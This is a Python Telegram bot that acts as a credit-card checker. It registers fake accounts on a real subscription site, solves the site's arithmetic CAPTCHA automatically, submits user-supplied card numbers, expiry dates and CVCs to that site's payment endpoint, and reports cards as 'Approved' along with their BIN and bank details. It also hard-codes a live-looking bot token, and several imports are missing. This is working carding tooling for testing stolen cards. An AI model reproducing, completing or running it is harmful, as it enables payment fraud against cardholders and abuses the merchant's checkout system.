import json
from datetime import datetime
import requests
from telebot import TeleBot
from bs4 import BeautifulSoup
import random
from faker import Faker

bot = TeleBot('7810214013:AAGAjs0Qmz2kpDOA7mhoTOD9T14b1rDqU08')
faker = Faker()
fake = Faker()

# Load the data from the JSON file
def load_data():
    try:
        with open('data.json') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error reading JSON file: {e}")
        return {}
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        return {}

# Initialize data and command_usage
data = load_data()
command_usage = {}

def StripCabtcha_Cokies():
    try:
        fer = faker.first_name()
        lat = faker.first_name()
        no = faker.first_name().upper()
        mo = faker.first_name().upper()
        name = f"{no} {mo}"
        psw = faker.password()
        hell = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(17))
        domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
        email = hell + domin
        eq = "https://www.lagreeod.com/subscribe"
        hh = requests.get(eq, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}).cookies['ci_session']
        cookies = {'ci_session': hh}
        hd = {
            'authority': 'www.lagreeod.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        # Solve CAPTCHA
        rw = requests.get('https://www.lagreeod.com/register/check_sess_numbers', cookies=cookies, headers=hd).json()
        sm = rw['broj1']
        smok = rw['broj2']
        allf = smok + sm
        print(allf)
        try:
            os.remove('strip1_coki.txt')
            os.remove('strip1_num.txt')
        except:
            pass

        with open('strip1_coki.txt', 'a') as f:
            f.write(str(cookies) + '\n')

        with open('strip1_num.txt', 'a') as t:
            t.write(f"{sm}|{allf}|{fer}|{lat}|{name}|{psw}|{email}\n")

    except Exception as e:
        print(e)
        StripCabtcha_Cokies()

# Gateway function
def st(P):
    try:
        n, mm, yy, cvc = map(str.strip, P.split("|"))
        if yy.startswith('20'):
           yy = yy.split('20')[1]      
        try:
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        except:
            StripCabtcha_Cokies()
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
                    
        
        headers = {
            'authority': 'www.lagreeod.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'stripe_customer': '',
            'subscription_type': 'Annual Subscription',
            'firstname': fer,
            'lastname': lat,
            'email': email,
            'password': psw,
            'card[name]': name,
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc,
            'coupon': '',
            's1': sm,
            'sum': allf,
        }

        res = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
        if 'Wrong result. Please sum these two numbers correctly.' in res.text or 'That email has already been taken. Please choose another.' in res.text or 'firstname' in res.text:
            msg = "Something Wrong Please Return Your Card Again"
            print(msg)
            StripCabtcha_Cokies()
        else:
            try:
                return res.json()
            except:
                return {"error": "Response content is not in JSON format", "details": res.text}

    except Exception as e:
        return {"error": str(e)}

@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or message.text.lower().startswith('/st'))
def respond_to_st(message):
    global data
    user_id = str(message.from_user.id)
    
    # Check if user is registered
    if user_id not in data:
        bot.reply_to(message, "You need to be registered to use this command.")
        return
    
    gate = 'Charged '
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Check last command usage time
    if idt not in command_usage:
        command_usage[idt] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    time_diff = (current_time - command_usage[idt]['last_time']).seconds
    
    if time_diff < 15:
        bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
        return
    
    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    
    try:
        cc = message.reply_to_message.text
    except AttributeError:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:غلططط
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = str(st(cc))
    except Exception as e:
        print(f"Error processing command: {e}")
        last = 'Error'
    
    # Get card info from data.json or API
    bin_info = data.get(cc[:6], {})
    
    if not bin_info:
        try:
            bin_info = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
    
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗔ρρяσνє𝗗 ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸 → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} {country_flag}
━━━━━━━━━━━━━━━━
[❖] 𝗧𝗶𝗺𝗲 → {execution_time:.2f} 𝗦𝗲𝗰
━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 → @{message.from_user.username} ✔</b>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

# Start the bot
bot.polling()
